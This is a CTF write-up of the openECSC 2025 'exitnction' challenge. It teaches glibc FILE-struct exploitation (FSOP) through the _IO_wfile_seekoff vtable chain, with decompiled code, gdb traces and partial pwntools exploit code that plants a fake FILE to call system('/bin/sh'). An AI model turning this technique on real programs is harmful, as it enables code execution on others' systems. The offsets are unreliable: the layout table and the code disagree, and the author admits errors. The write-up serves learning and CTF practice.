---
title: "Introduction to file struct exploitation: openECSC 2025 – exitnction"
date: 2025-10-15
toc: true
---

![](https://github.com/user-attachments/assets/1d984a88-3fd5-419b-aca0-5e64948618d9)

> `this blog needs to be checked ... im certain there are mistakes ... so, look out! will update it when i get time .. `

## TL;DR

Used `_IO_wfile_seekoff` as the vtable entry point for fsop to pivot into `_wide_data->_wide_vtable->__overflow`, bypassing glibc's vtable validation and achieving code execution.

## Background

Before diving in — quick disclaimer. I’m **not** an FSOP wizard or a heap master or any of that. This was literally my _first proper_ `FILE` structure exploitation challenge. I learned the whole `fsop` stuff _just to solve this chall_, so if you spot something off, feel free to message me on discord!

This writeup was made as a submission in best writeup competition for openECSC 2025, and I tried to make it as clean and beginner-readable as possible — explaining every decision I made while debugging. I also mixed in some glibc internals exploration since I wanted to understand what was actually happening rather than just cargo-culting someone else’s PoC.

So yeah — if something looks cursed, it probably is, but it worked :)

## First Look

Let's take a look at the files we are given:

```bash
$ tar xzvf exitnction.tar.gz 
exitnction/
exitnction/Dockerfile
exitnction/docker-compose.yml
exitnction/flag.txt
exitnction/exitnction

$ cd exitnction
$ file ./exitnction | tr ',' '\n'
./exitnction: ELF 64-bit LSB pie executable
 x86-64
 version 1 (SYSV)
 dynamically linked
 interpreter /lib64/ld-linux-x86-64.so.2
 BuildID[sha1]=f531e50a36ad71168e198a5682ddd066791db04b
 for GNU/Linux 3.2.0
 not stripped

$ pwn checksec ./exitnction
[*] '/home/kali/exitnction/exitnction'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Running the binary we are presented by a simple menu:

```bash
$ ./exitnction       
Welcome to the 'Exitnction' mail client!

Exitnction Mail Client Commands:
  read          - Read emails
  write         - Write an e-mail
  server        - Print mail server information
  help          - Show this help message
  exit          - Exit


> ^C
```

## Dissecting the Program

According to the menu, the program allows us to **read or write emails**, **view server information**, **print the help message**, or **exit**. 

The `main()` function declares a few variables:

![](https://github.com/user-attachments/assets/a817bd07-22e1-4183-a0ee-aa3bcc51bd6d)

Then allocates a chunk to store the default license information and copies the first license from a a bunch of different licenses you can have from this global variable `licenses`.

![](https://github.com/user-attachments/assets/51f1808e-2e54-4259-a7c0-ae4b0f0dc33e)

`licenses` is a array of pointers stored in `.data` section:

![](https://github.com/user-attachments/assets/2954bd4d-c68d-4573-a0ee-ecea13f5f33b)

Now, that we have that out of the way let's analyze the menu do-while loop:

```c
undefined8 main(void)
{
...SNIP...
  puts("Welcome to the \'Exitnction\' mail client!\n");
  print_help();
menu_loop:
  do {
    __printf_chk(2,"\n> ");
    bytesRead = __isoc23_scanf("%9s",&choice);
    if (bytesRead != 1) {
exit:
      free(current_license);
      if (canary == *(long *)(in_FS_OFFSET + 0x28)) {
        return 0;
      }
      __stack_chk_fail();
    }
...SNIP...
  } while( true );
}
```

`print_help()` function just prints the menu that we saw in the beginning:

```c
void print_help(void)
{
  puts("Exitnction Mail Client Commands:");
  puts("  read          - Read emails");
  puts("  write         - Write an e-mail");
  puts("  server        - Print mail server information");
  puts("  help          - Show this help message");
  puts("  exit          - Exit");
  puts("");
  return;
}
```

After printing the help message the program enters a `do-while` loop where it asks for option and then performs accordingly. 

The program uses integer comparisons against string hashes rather than `strcmp()`. For clarity, I'll represent these as their string equivalents:

```c
// Simplified from: if ((choice == 0x74697277) && ...)
if (choice == "write") {
...SNIP...
    write_email();
}
```

Here is the logic behind the `do-while` menu:

```c
if (choice != 'read') {
  if (choice == 'write') {
    if (3 < sent_mails) {
      __printf_chk(2,"Sorry, your license \'%s\' limits you to sending %d emails :(","Trial",3);
      goto exit;
    }
    write_email();
  }
  else if (choice == 'server') {
    mail_server_info();
  }
  else if (choice == 'help') {
    print_help();
  }
  else {
    if (choice == 'exit') {
      exit(0);
    }
    puts("Unknown command. Type \'help\' for options.");
  }
  goto menu_loop;
}
read_emails();
```

`read_emails()` loops through the ptrs present in the inbox and prints the contents present at the address the ptrs points to.

```c
void read_emails(void)

{
  char *license;
  ulong idx;
  ulong i;
  long offset;
  
...SNIP...
  i = 1;
  puts("=== Inbox ===");
  do {
    offset = i * 8;
    idx = i & 0xffffffff;
    i = i + 1;
    __printf_chk(2,"\nMail #%d:\n%s\n",idx,*(undefined8 *)(&inbox + offset));
  } while (i != 4);
  return;
}
```

![](https://github.com/user-attachments/assets/bc0d721a-d9ee-41d4-b25a-d1a5c972eb17)


```bash
> read
=== Inbox ===

Mail #1:
From: pwn@exit.ctf
Subject: Hello!
Body: Just saying hi.

Mail #2:
From: alice@exitnction.ctf
Subject: Meeting
Body: Don't forget our meeting tomorrow.

Mail #3:
From: bob@exitnction.ctf
Subject: Lunch
Body: Let's have lunch today.

> 
```

`write_email()` asks for a recipient address (as hex), then an 8-byte subject and a 64-byte body. It copies the subject and body from stack buffers into `recipient`.

```c
__printf_chk(2,"\nEnter recipient email address as hex (e.g. 0x7774664065786974): 0x");
__isoc23_scanf("%lx",&recipient);
getc(stdin);

__printf_chk(2,"\nEnter Subject (8 chars): ");
fgets(&subject,9,stdin);
pos = strcspn(&subject,"\n");
(&subject)[pos] = '\0';

__printf_chk(2,"\nEnter Body (64 chars): ");
fgets(&body,65,stdin);
pos = strcspn(&body,"\n");
(&body)[pos] = '\0';

/* If subject not empty: write the 8-byte aligned subject into *recipient */
if (subject != '\0') {
   *recipient = CONCAT71(uStack_6f,subject);
}

/* If body not empty: write multiple 8-byte words from local stack into recipient[0..7] */
if (body != '\0') {
	*recipient = CONCAT71(uStack_66,body);
	recipient[1] = uStack_5f;
	recipient[2] = local_57;
	recipient[3] = uStack_4f;
	recipient[4] = local_47;
	recipient[5] = uStack_3f;
	recipient[6] = local_37;
	recipient[7] = uStack_2f;
}

sent_mails = sent_mails + 1;
puts("\nEmail has been successfully sent to the recipient!");
```

This is effectively a **write what where primitive** because we control both the destination and the content! Also one more thing to notice here is that in the `do-while` loop the program checks if the `sent_mails` is greater than 3 or not and if it is greater than 3 it exits. So, we'll have to overwrite it after 3 writes if we want to do the write multiple times.

![](https://github.com/user-attachments/assets/154a737d-4728-4fd6-8f50-a85472b6d518)

`mail_server_info()` prints the address of `current_license` and `exit()` effectively giving us a libc and pie leak.

```c
void mail_server_info(void)
{
  int pos;
  undefined8 libc_release;
  undefined8 libc_version;
  
  puts("=== Mail Server Information ===");
  __printf_chk(2,"Name: %s\n","EXITNCTION");
  __printf_chk(2,"Version: %s\n","1.3.3.7");
  __printf_chk(2,"Email sending limit: %d/%d\n",sent_mails,3);
  __printf_chk(2,"License: %s (%p)\n","Trial",&current_license);
  libc_release = gnu_get_libc_release();
  libc_version = gnu_get_libc_version();
  __printf_chk(2,"Backend: %s-%s (%p)\n",libc_version,libc_release,exit);
  pos = strcmp(current_license,"DEBUG");
  if (pos != 0) {
    return;
  }
  __printf_chk(2,"Internal Debug Info: %p",_r_debug._8_8_);
  return;
}
```

```bash
> server
=== Mail Server Information ===
Name: EXITNCTION
Version: 1.3.3.7
Email sending limit: 0/3
License: Trial (0x55a143c070b0)
Backend: 2.39-stable (0x7fb435847ba0)

> ^C
```

## Exploitation

Now what? We have a write what where ... but, no idea what to do with it. :'(

What we could do is took a look at the limitations we have thus, helping us eliminate techinques and then see what we are left with.

Let's see! `Full RELRO` is enabled so, we can't perform `got overwrite`. There is a call to `free()` when the program exits! But, in `>= glibc-2.34` the `__malloc_hook` and `__free_hook` are not used so, can't do that either. There are only two options we are left with that are `$rip` overwrite by leaking stack address through `environ` variable and then overwriting the saved address by a `rop chain`. Or, we could perform file struct exploitation by writing a fake file struct to writeable memory and then overwriting `_IO_list_all` to that fake file struct so, when `_IO_flush_all` is called it executes the function pointed by the `vtable` of the file structs and then, using `_IO_wfile_seekoff->_IO_switch_to_wget_mode->__OVERFLOW` chain to do `system('/bin/sh\x00')`. 

> Update:
> I was talking to someone from pwn.college discord server and he told me that the intended path was to corrupt the exit handlers and thus the name `exit-nction`. And, here I was thinking that it was extinction.
> https://m101.github.io/binholic/2017/05/20/notes-on-abusing-exit-handlers.html 

Now, I chose to do file struct exploitation because i'm the follower of mantra "reject rop and embrace fsop!".

---

### What are file structs? `_IO_FILE` & `_IO_FILE_plus`

In order to understand how we file structure exploitation works let's deep dive! Now, what is a file struct? `_IO_FILE` is a structure that is usually returned by functions like `fopen` and used by functions like `fwrite`, `fread` etc. Now, why do we need these file structs? We were doing just fine with `write` and `read` syscall? The purpose of file structs is to the read and write operation faster by using a buffer reduce the number of read and write syscalls.

```c
/* The tag name of this struct is _IO_FILE to preserve historic
   C++ mangled names for functions taking FILE* arguments.
   That name should not be used in new code.  */
struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};

struct _IO_FILE_complete
{
  struct _IO_FILE _file;
#endif
  __off64_t _offset;
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};
```

> https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/bits/types/struct_FILE.h#L49

The `_IO_FILE` is extended into `_IO_FILE_plus` as follow:

```c
/* We always allocate an extra word following an _IO_FILE.
   This contains a pointer to the function jump table used.
   This is for compatibility with C++ streambuf; the word can
   be used to smash to a pointer to a virtual function table. */

struct _IO_FILE_plus
{
  FILE file;
  const struct _IO_jump_t *vtable;
};
```

### Why Overwrite a FILE?

In order to answer that question let's follow what the program does after `exit()` is called. 

```bash
$ gdb -q ./exitnction 
...SNIP...
pwndbg> b exit
Breakpoint 1 at 0x7ffff7c47ba0: file ./stdlib/exit.c, line 137.
pwndbg> r
...SNIP...
Welcome to the 'Exitnction' mail client!

Exitnction Mail Client Commands:
  read          - Read emails
  write         - Write an e-mail
  server        - Print mail server information
  help          - Show this help message
  exit          - Exit


> exit
Breakpoint 1, __GI_exit (status=0) at ./stdlib/exit.c:137
```

![](https://github.com/user-attachments/assets/67a4318e-3fe1-422d-81cb-8ea6738da6ba)


`exit()` function calls `__run_exit_handlers()` let's step into that!

```
pwndbg> ni 6
...SNIP...
pwndbg> si
...SNIP...
```

Stepping through `__run_exit_handlers()`, I found that it calls `_IO_cleanup()`:

![](https://github.com/user-attachments/assets/a170560c-e8a8-483c-92be-72f56ea007a9)


Let's step into `_IO_cleanup()` and see what other functions it's calling:

```
pwndbg> si
...SNIP...
```

If we step through `_IO_cleanup()` we find that it's calling `_IO_flush_all()`:

![](https://github.com/user-attachments/assets/2999609e-b2bc-4b01-abe1-1c815f4b559f)


`_IO_flush_all()` walks the `file->_chain->_chain-> ... -> NULL` linked list and calls the vtable for each file structs if it's passes the `IO_validate_vtable` function which checks if it's within the `__io_vtables` region.

```c
int
_IO_flush_all (void)
{
  int result = 0;
  FILE *fp;

#ifdef _IO_MTSAFE_IO
  _IO_cleanup_region_start_noarg (flush_cleanup);
  _IO_lock_lock (list_all_lock);
#endif

  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)
    {
      run_fp = fp;
      _IO_flockfile (fp);

      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
	   || (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base))
	   )
	  && _IO_OVERFLOW (fp, EOF) == EOF)
	result = EOF;

      _IO_funlockfile (fp);
      run_fp = NULL;
    }

#ifdef _IO_MTSAFE_IO
  _IO_lock_unlock (list_all_lock);
  _IO_cleanup_region_end (0);
#endif

  return result;
}
libc_hidden_def (_IO_flush_all)
```

> `_IO_list_all` is the head of the linked list which is maintained by glibc of open file structs! `_IO_list_all` by default points to `stderr` file struct.
> `struct _IO_FILE_plus *_IO_list_all = &_IO_2_1_stderr_;`

`_IO_flush_all` moves the file struct's vtable to `rax` and then, dereferences `rax+0x18`.

```bash
pwndbg> disas _IO_flush_all
Dump of assembler code for function __GI__IO_flush_all:
...SNIP...
   0x00007ffff7c961c1 <+193>:   mov    rax,QWORD PTR [rbx+0xd8]
...SNIP...
   0x00007ffff7c961e3 <+227>:   call   QWORD PTR [rax+0x18]
...SNIP...
```

So, if we can control the vtable we could redirect execution to a place of our choice! 

### Stop — There’s a Vtable Gatekeeper

Now, the vtable has to be within the `__io_vtables` region else the program will exit cause of a protection to this kind of attack introduced in `>= glibc-2.24`:

```c
#define IO_VTABLES_LEN (IO_VTABLES_NUM * sizeof (struct _IO_jump_t))

...SNIP...

/* Perform vtable pointer validation.  If validation fails, terminate
   the process.  */
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  uintptr_t ptr = (uintptr_t) vtable;
  uintptr_t offset = ptr - (uintptr_t) &__io_vtables;
  if (__glibc_unlikely (offset >= IO_VTABLES_LEN))
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();
  return vtable;
}
```

> https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/libioP.h#L1022

The `__io_vtables` is a struct defined [here](https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/vtables.c#L92).

```c
const struct _IO_jump_t __io_vtables[] attribute_relro =
{
  /* _IO_str_jumps  */
  [IO_STR_JUMPS] =
  {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_str_finish),
    JUMP_INIT (overflow, _IO_str_overflow),
    ...SNIP...
  },
  /* _IO_wstr_jumps  */
  [IO_WSTR_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_wstr_finish),
    JUMP_INIT (overflow, (_IO_overflow_t) _IO_wstr_overflow),
    ...SNIP...
  },
  /* _IO_file_jumps  */
  [IO_FILE_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_file_finish),
    JUMP_INIT (overflow, _IO_file_overflow),
    ...SNIP...
  },
  /* _IO_file_jumps_mmap  */
  [IO_FILE_JUMPS_MMAP] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_file_finish),
    JUMP_INIT (overflow, _IO_file_overflow),
    ...SNIP...
  },
  /* _IO_file_jumps_maybe_mmap  */
  [IO_FILE_JUMPS_MAYBE_MMAP] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_file_finish),
    JUMP_INIT (overflow, _IO_file_overflow),
    ...SNIP...
  },
  /* _IO_wfile_jumps  */
  [IO_WFILE_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_new_file_finish),
    JUMP_INIT (overflow, (_IO_overflow_t) _IO_wfile_overflow),
    ...SNIP...
  },
  /* _IO_wfile_jumps_mmap  */
  [IO_WFILE_JUMPS_MMAP] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_new_file_finish),
    JUMP_INIT (overflow, (_IO_overflow_t) _IO_wfile_overflow),
    ...SNIP...
  },
  /* _IO_wfile_jumps_maybe_mmap  */
  [IO_WFILE_JUMPS_MAYBE_MMAP] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_new_file_finish),
    JUMP_INIT (overflow, (_IO_overflow_t) _IO_wfile_overflow),
    ...SNIP...
  },
  /* _IO_cookie_jumps  */
  [IO_COOKIE_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_file_finish),
    JUMP_INIT (overflow, _IO_file_overflow),
    ...SNIP...
  },
  /* _IO_proc_jumps  */
  [IO_PROC_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_new_file_finish),
    JUMP_INIT (overflow, _IO_new_file_overflow),
    ...SNIP...
  },
  /* _IO_mem_jumps  */
  [IO_MEM_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_mem_finish),
    JUMP_INIT (overflow, _IO_str_overflow),
    ...SNIP...
  },
  /* _IO_wmem_jumps  */
  [IO_WMEM_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_wmem_finish),
    JUMP_INIT (overflow, (_IO_overflow_t) _IO_wstr_overflow),
    ...SNIP...
  },
  [IO_PRINTF_BUFFER_AS_FILE_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, NULL),
    JUMP_INIT (overflow, __printf_buffer_as_file_overflow),
    ...SNIP...
  },
  [IO_WPRINTF_BUFFER_AS_FILE_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, NULL),
    JUMP_INIT (overflow, (_IO_overflow_t) __wprintf_buffer_as_file_overflow),
    ...SNIP...
  },

#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)
  /* _IO_old_file_jumps  */
  [IO_OLD_FILE_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_old_file_finish),
    JUMP_INIT (overflow, _IO_old_file_overflow),
    ...SNIP...
  },
  /*  _IO_old_proc_jumps  */
  [IO_OLD_PROC_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_old_file_finish),
    JUMP_INIT (overflow, _IO_old_file_overflow),
    ...SNIP...
  },
#endif

#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_2)
  /* _IO_old_cookie_jumps  */
  [IO_OLD_COOKIED_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_file_finish),
    JUMP_INIT (overflow, _IO_file_overflow),
    ...SNIP...
  },
#endif
};
```

It's divided into parts for each category of jumps [here](https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/libioP.h#L509).

```c
extern const struct _IO_jump_t __io_vtables[] attribute_hidden;
#define _IO_str_jumps                    (__io_vtables[IO_STR_JUMPS])
#define _IO_wstr_jumps                   (__io_vtables[IO_WSTR_JUMPS])
#define _IO_file_jumps                   (__io_vtables[IO_FILE_JUMPS])
#define _IO_file_jumps_mmap              (__io_vtables[IO_FILE_JUMPS_MMAP])
#define _IO_file_jumps_maybe_mmap        (__io_vtables[IO_FILE_JUMPS_MAYBE_MMAP])
#define _IO_wfile_jumps                  (__io_vtables[IO_WFILE_JUMPS])
#define _IO_wfile_jumps_mmap             (__io_vtables[IO_WFILE_JUMPS_MMAP])
#define _IO_wfile_jumps_maybe_mmap       (__io_vtables[IO_WFILE_JUMPS_MAYBE_MMAP])
#define _IO_cookie_jumps                 (__io_vtables[IO_COOKIE_JUMPS])
#define _IO_proc_jumps                   (__io_vtables[IO_PROC_JUMPS])
#define _IO_mem_jumps                    (__io_vtables[IO_MEM_JUMPS])
#define _IO_wmem_jumps                   (__io_vtables[IO_WMEM_JUMPS])
#define _IO_printf_buffer_as_file_jumps  (__io_vtables[IO_PRINTF_BUFFER_AS_FILE_JUMPS])
#define _IO_wprintf_buffer_as_file_jumps (__io_vtables[IO_WPRINTF_BUFFER_AS_FILE_JUMPS])
#define _IO_old_file_jumps               (__io_vtables[IO_OLD_FILE_JUMPS])
#define _IO_old_proc_jumps               (__io_vtables[IO_OLD_PROC_JUMPS])
#define _IO_old_cookie_jumps             (__io_vtables[IO_OLD_COOKIED_JUMPS])
```

### `_IO_wfile_seekoff` saves the day

So, we have a lot of valid vtables that we can call! This is where the `_IO_wfile_seekoff` chain comes into action! `_IO_wfile_seekoff` vtable calls the  `_wide_data->_wide_vtable->__overflow`. If you don't know what `_wide_data` is it's a struct very similar to `_IO_FILE` but, with a few differences. 

```c
/* Extra data for wide character streams.  */
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;	/* Current read pointer */
  wchar_t *_IO_read_end;	/* End of get area. */
  wchar_t *_IO_read_base;	/* Start of putback+get area. */
  wchar_t *_IO_write_base;	/* Start of put area. */
  wchar_t *_IO_write_ptr;	/* Current put pointer. */
  wchar_t *_IO_write_end;	/* End of put area. */
  wchar_t *_IO_buf_base;	/* Start of reserve area. */
  wchar_t *_IO_buf_end;		/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;	/* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;	/* Pointer to first valid character of
				   backup area */
  wchar_t *_IO_save_end;	/* Pointer to end of non-current get area. */

  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;

  wchar_t _shortbuf[1];

  const struct _IO_jump_t *_wide_vtable;
};
```

`_IO_wfile_seekoff` calls `_IO_switch_to_wget_mode` with first argument `rdi` set to the file structs beginning.

```bash
pwndbg> disas _IO_wfile_seekoff
...SNIP...
   0x00007ffff7c8d2e5 <+101>:   mov    rdi,r13
   0x00007ffff7c8d2e8 <+104>:   call   0x7ffff7c8afb0 <__GI__IO_switch_to_wget_mode>
```

`_IO_switch_to_wget_mode` loads our fake FILE's `_wide_data` pointer into `rax`, then dereferences `rax+0xe0` to get the `_wide_vtable` address, and finally calls the function pointer at `_wide_vtable+0x18`. 

```bash
pwndbg> disas _IO_switch_to_wget_mode
...SNIP...
   0x00007ffff7c8afc0 <+16>:    mov    rax,QWORD PTR [rdi+0xa0]
...SNIP...
   0x00007ffff7c8afd1 <+33>:    mov    rax,QWORD PTR [rax+0xe0]
   0x00007ffff7c8afdd <+45>:    call   QWORD PTR [rax+0x18]
```

So, in a nutshell `*(*(fp->_wide_data + 0xe0) + 0x18)` is being called! One important thing to know here is the reason why `_IO_switch_to_wget_mode` adds `0x18` to rax before calling the dereferenced function? The reason is because the data type of `_wide_vtable` is `_IO_jump_t` which is defined as follows:

```c
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
};
```


> https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/libioP.h#L294

So, the function that the `_IO_switch_to_wget_mode` is calling is `__overflow` and thus the 0x18 offset!

```
0x00: __dummy  
0x08: __dummy2  
0x10: __finish  
0x18: __overflow ← WE HIJACK THIS!  
0x20: __underflow
```

### Planting the Seed — What, Where & Why?

Now, that we fully understand what file structs are and how we can exploit them using the `_IO_wfile_seekoff` chain let's move on to the part where we write the exploitation script. The basic concept is that we place a crafted file struct in the `.bss` section and overwrite the `_IO_list_all` to point to the crafted file struct so, when `_IO_flush_all` is called the top of the list is our crafted file struct and exploit get's triggered and we get the shell.

Now this is the file structure that we are gonna be writing to the memory:

```bash
fs[0x00] = "/bin/sh"                    ; _flags 
fs[0x18] = system                       ; _IO_read_base
fs[0x88] = _IO_stdfile_2_lock           ; _lock
fs[0xa0] = _wide_data ptr               ; fp-0x20
fs[0xd0] = ptr to fake file             ; fp
fs[0xd8] = vtable                       ; (_IO_wfile_jumps+0x48)-0x18

> the rest of the contents are set to 0x00
```

Lemme explain why? So, when `_IO_flush_all` is moves into rax the `vtable` which is present at `0xd8` offset and then adds `0x18` to the value of `rax` and then dereferences it before calling it. 

```
pwndbg> disas _IO_flush_all
Dump of assembler code for function __GI__IO_flush_all:
...SNIP...
   0x00007ffff7c961c1 <+193>:   mov    rax,QWORD PTR [rbx+0xd8]
...SNIP...
   0x00007ffff7c961e3 <+227>:   call   QWORD PTR [rax+0x18]
...SNIP...
```

So, this tells us that our vtable is supposed to contain the address of the `_IO_wfile_seekoff` jump subtracted by `0x18`. Now, the `_IO_wfile_seekoff` jump is stored at `_IO_wfile_jumps+0x48`:

```shell
pwndbg> p &_IO_wfile_jumps
$7 = (<data variable, no debug info> *) 0x7fa156802228 <_IO_wfile_jumps>
pwndbg> x/a 0x7fa156802228+0x48
0x7fa156802270 <_IO_wfile_jumps+72>:    0x7fa15668d280 <__GI__IO_wfile_seekoff>
```

So, we place `(_IO_wfile_jumps+0x48)-0x18` to the vtable of our fake file struct. So,, `_IO_flush_all` calls the `_IO_wfile_seekoff` which in turn calls `_IO_switch_to_wget_mode`. `_IO_switch_to_wget_mode` moves `*(rdi+0xa0)` into `rax`. Now, `rdi+0xa0` is the `_wide_data` calls `rdi` is the starting of the fake file! It then moves `*(rax+0xe0)` where `rax` is the `_wide_data` which we set to `fp-0x20` so, `fp-0x20+0xe0 = 0xd0` where we have written the pointer to the file struct. It then calls `*(rax+0x18)` where rax is the file pointers so, what we are calling is `fp+0x18` where we have placed the system function address. Also, the `rdi` is still pointing to the start of the file struct so, the first argument to system is `fp` whose first 8-bytes are `/bin/sh\x00`.

```bash
pwndbg> disas _IO_switch_to_wget_mode
...SNIP...
   0x00007ffff7c8afc0 <+16>:    mov    rax,QWORD PTR [rdi+0xa0]
...SNIP...
   0x00007ffff7c8afd1 <+33>:    mov    rax,QWORD PTR [rax+0xe0]
   0x00007ffff7c8afdd <+45>:    call   QWORD PTR [rax+0x18]
```

### Now What — PoC Time!

Now that we understand exactly what memory layout we need, let's use our write-what-where primitive to construct it piece by piece in the `.bss` section. First, we need to know where to build our fake structure and as the `mail_server_info()` function prints the address of `current_license` and the address of `exit()` function we have the leaks needed. We just need to parse them!

```python
io.recvuntil(b"0x")
pieBase = int(io.recvline().strip().decode()[:-1], 16) - exe.symbols['current_license']

io.recvuntil(b"0x")
libc.address = int(io.recvline().strip().decode()[:-1], 16) - libc.symbols['exit']
```

Now, that we have the `pieBase` and `libc.address` we just need to find a suitable location in the `.bss` section to write our file struct to.

```
pwndbg> dq 0x555555554000+0x4210 28
0000555555558210     0000000000000000 0000000000000000
0000555555558220     0000000000000000 0000000000000000
0000555555558230     0000000000000000 0000000000000000
0000555555558240     0000000000000000 0000000000000000
0000555555558250     0000000000000000 0000000000000000
0000555555558260     0000000000000000 0000000000000000
0000555555558270     0000000000000000 0000000000000000
0000555555558280     0000000000000000 0000000000000000
0000555555558290     0000000000000000 0000000000000000
00005555555582a0     0000000000000000 0000000000000000
00005555555582b0     0000000000000000 0000000000000000
00005555555582c0     0000000000000000 0000000000000000
00005555555582d0     0000000000000000 0000000000000000
00005555555582e0     0000000000000000 0000000000000000
```

So, I wrote this helper function to facilitate in the write what where:

```python
def write(addr, data):
    io.sendlineafter(b"> ", b"write")
    io.sendlineafter(b": 0x", hex(addr).encode())
    io.sendlineafter(b"(8 chars): ", data)
    io.sendlineafter(b"(64 chars): ", b"")
```

I decided to do 8-byte writes and not 64-bytes just for the sake of simplifying so you guys can easily understand!

Now, before we start building the exploit let me remind you there is a limit on the writes that you can do which is set to 3. So, we'll have to overwrite it after three writes so, it doesn't exit. I tried overwriting it with a very large negative number to get a lot of writes but, that didn't work maybe cause the check is against a unsigned decimal? But, I figured out that if you overwrote it to `-1`, the program after the write and before the check will add one to it making it zero.

```python
# Place this line after ever three writes!
write(pieBase + exe.symbols['sent_mails'], p64(-1, sign=True))
```

Now, let's get started with placing the file struct in the `.bss` section. As you can see from the above memory inspection the area is zero'ed by default so, we only need to write the non-zero values.

```python
write(pieBase + 0x4210, b"/bin/sh\x00".ljust(0x8, b"\x00"))
write(pieBase + 0x4210 + 0x18, p64(libc.symbols["system"]))
write(pieBase + 0x4210 + 0x88 + 1, p64(libc.address + 0x205700)[1:])
write(pieBase + exe.symbols['sent_mails'], p64(-1, sign=True))
```

You might be confused why I'm truncating the LSB of the `_lock` value. That's cause it's zero by default and sending `0x00` stops `fgets` reading!

```python
write(pieBase + 0x4210 + 0xa0, p64(pieBase + 0x4210 - 0x20))
write(pieBase + 0x4210 + 0xc0, p64(pieBase + 0x4210))
write(pieBase + 0x4210 + 0xd8, p64((libc.symbols['_IO_wfile_jumps'] + 0x48) - 0x18))
write(pieBase + exe.symbols['sent_mails'], p64(-1, sign=True))
```

